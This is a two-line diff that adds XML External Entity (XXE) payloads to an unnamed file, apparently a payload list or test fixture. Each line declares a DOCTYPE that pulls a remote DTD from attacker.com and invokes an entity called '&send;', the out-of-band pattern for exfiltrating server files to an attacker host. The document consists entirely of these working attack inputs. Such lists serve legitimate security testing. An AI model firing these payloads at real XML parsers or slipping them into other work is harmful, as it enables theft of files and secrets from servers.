@@ -1,0 +1,2 @@
+<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://attacker.com/xxe.dtd"><root>&send;</root>
+<?xml version="1.0"?><!DOCTYPE root PUBLIC "-//Attacker//DTD XXE//EN" "http://attacker.com/xxe.dtd"><root>&send;</root>
